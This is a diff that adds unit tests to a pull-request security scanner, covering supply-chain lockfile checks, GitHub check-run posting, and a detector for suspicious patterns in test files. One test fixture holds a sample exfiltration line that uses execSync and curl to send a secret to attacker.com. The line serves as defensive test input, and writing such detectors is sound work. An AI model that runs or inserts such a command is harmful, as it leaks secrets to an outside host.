@@ -3,6 +3,7 @@ import assert from 'node:assert/strict';
 import {
   buildAdvisoryPayload,
   findExistingDraftAdvisory,
+  postSecurityCheckRun,
   scanSecrets,
   scanCITampering,
   scanBuildScripts,
@@ -107,6 +108,16 @@ test('scanSupplyChain: ignores peer suffixes when matching package names', () =>
   assert.equal(scanSupplyChain(files).length, 0);
 });
 
+test('scanSupplyChain: flags net-new packages that include pnpm peer suffixes', () => {
+  const patch = `@@ -1,2 +1,3 @@
++evil-package@1.0.0(react@18.2.0):
+ existing-package@2.0.0:
+`;
+  const files = [{ filename: 'pnpm-lock.yaml', patch }];
+  const flags = scanSupplyChain(files);
+  assert.deepEqual(flags, [{ check: 'supply-chain', packages: ['evil-package'] }]);
+});
+
 test('findExistingDraftAdvisory: returns matching draft advisory from paginated results', async () => {
   const calls = [];
   const fakeFetch = async (path) => {
@@ -169,6 +180,28 @@ test('syncDraftAdvisory: creates a new advisory when none exists', async () => {
   assert.equal(calls[1].path, '/repos/paperclipai/paperclip/security-advisories');
   assert.equal(calls[1].options.method, 'POST');
   assert.deepEqual(JSON.parse(calls[1].options.body), buildAdvisoryPayload(6469, 'My PR', flags));
+});
+
+test('postSecurityCheckRun: uses the injected fetch implementation', async () => {
+  const calls = [];
+
+  await postSecurityCheckRun(async (path, token, options) => {
+    calls.push({ path, token, options });
+    return { ok: true };
+  }, 'token', 'paperclipai/paperclip', 'deadbeef', true);
+
+  assert.equal(calls.length, 1);
+  assert.equal(calls[0].path, '/repos/paperclipai/paperclip/check-runs');
+  assert.equal(calls[0].options.method, 'POST');
+  assert.deepEqual(JSON.parse(calls[0].options.body), {
+    name: 'security-review',
+    head_sha: 'deadbeef',
+    status: 'in_progress',
+    output: {
+      title: 'Security Review Pending',
+      summary: 'This PR has been flagged for manual security review by a maintainer. No action needed from you.',
+    },
+  });
 });
 
 test('validateSensitivePaths: checks paths against the resolved base ref instead of master', async () => {
@@ -245,6 +278,14 @@ test('scanTestPatterns: ignores suspicious patterns in non-test files', () => {
     patch: `+  const res = await fetch('https://api.example.com')`,
   }];
   assert.equal(scanTestPatterns(files).length, 0);
+});
+
+test('scanTestPatterns: flags suspicious patterns in __tests__ directories', () => {
+  const files = [{
+    filename: 'src/__tests__/foo.ts',
+    patch: `+  execSync('curl https://attacker.com?data=' + secret)`,
+  }];
+  assert.ok(scanTestPatterns(files).length > 0);
 });
 
 // ── scanSensitivePaths ───────────────────────────────────────────────────────
